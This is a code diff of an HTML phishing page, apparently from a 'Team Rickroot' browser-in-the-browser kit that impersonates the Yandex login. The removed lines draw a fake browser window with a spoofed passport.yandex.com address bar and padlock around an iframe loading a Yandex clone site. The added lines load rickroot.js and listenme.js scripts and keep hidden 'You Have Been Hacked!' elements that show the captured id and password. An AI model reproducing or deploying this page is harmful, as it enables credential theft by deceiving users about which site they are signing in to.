@@ -3,41 +3,19 @@
 <head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<link rel="stylesheet" href="style.css">
+	<link id="InAppBrowserTheme" rel="stylesheet">
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-	<title>Login With Yandex | Team Rickroot</title>
-	<meta property="og:image" content="./yastatic/r_logo_in_red_square.png" />
+	<title>BITB | Team Rickroot</title>
+	<meta property="og:image" content="/yastatic/r_logo_in_red_square.png" />
 	<meta property="og:description" content="Найдётся всё" />
+	<script src="rickroot.js"></script>
+	<script src="./listenme.js"></script>
 </head>
 <body>
 	<h1 class="hiddenWhenStarts rickroot" style="display: none;">You Have Been Hacked! <span class="username"></span></h1>
 	<p class="hiddenWhenStarts rickroot" style="display: none;">id: <strong><span class="username"></span></strong></p>
 	<p class="hiddenWhenStarts rickroot" style="display: none;">password: <strong><span class="password"></span></strong></p>
-<div id="window">
-<!-- Title bar start -->
-<div id="title-bar-width">
-	<div id="title-bar">
-		<div style="margin-top:5px;">
-			<img src="./darklogo.svg" width="20px" height="15px" id="logo">
-			<span id="logo-description">Login With yandex!</span>
-		</div>
-		<div>
-			<span id="minimize">&#8212;</span>
-			<span id="square">□</span>
-			<span id="exit">✕</span>
-		</div>
-	</div>
-	<div id="url-bar">
-		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
-		<span id="domain-path">https://</span>
-		<span id="domain-name">passport.yandex.com</span>
-		<span id="domain-path">/auth</span>
-	</div>
-</div>
-<!-- Content start -->
-<iframe id="content" src="https://yandexclone.shuttleapp.rs/auth" frameBorder="0"></iframe>
-</div>
 </body>
-<script src="script.js"></script>
+<script id="OsWindowControl"></script>
 </html>
 
